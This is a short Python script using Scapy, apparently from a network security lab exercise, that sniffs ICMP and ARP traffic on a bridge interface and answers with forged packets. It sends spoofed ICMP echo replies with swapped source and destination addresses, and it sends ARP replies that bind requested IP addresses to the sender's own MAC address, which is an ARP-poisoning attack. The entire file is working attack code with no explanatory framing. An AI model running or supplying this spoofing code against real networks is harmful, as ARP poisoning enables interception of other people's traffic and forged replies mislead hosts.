#!/usr/bin/env python3
from scapy.all import *

def send_icmp(pkt):
	print("sent ICMP spoffing packets..")
	a=IP()
	a.dst=pkt[IP].src
	a.src=pkt[IP].dst
	b=ICMP()
	b.type=0
	b.id=pkt[ICMP].id
	b.seq=pkt[ICMP].seq
	c=Raw()
	c.load=pkt[Raw].load
	p=a/b/c
	send(p)

def send_arp(pkt):
	print("send ARP spoffing packets..")
	e=Ether()
	e.dst=pkt[Ether].src
	e.src=get_if_hwaddr('br-b7db7f7b9534')
	a=ARP()
	a.psrc=pkt[ARP].pdst
	a.pdst=pkt[ARP].psrc
	a.op=2
	a.hwsrc=get_if_hwaddr('br-b7db7f7b9534')
	a.hwdst=pkt[ARP].hwsrc
	a.hwlen = 6
	a.plen = 4
	p=e/a	
	sendp(e/a)
	
	
def catch_pkt(pkt):
	if ICMP in pkt and pkt[IP].dst is not pkt[IP].src:
		if pkt[ICMP].type==8:
			send_icmp(pkt)
	else:
		if ARP in pkt:
			if pkt[ARP].hwdst != pkt[ARP].hwsrc and pkt[ARP].op==1:
				send_arp(pkt)

print("start sniffing..")					
pkt = sniff(iface=['br-b7db7f7b9534','enp0s3'], filter='icmp or arp', prn=catch_pkt)

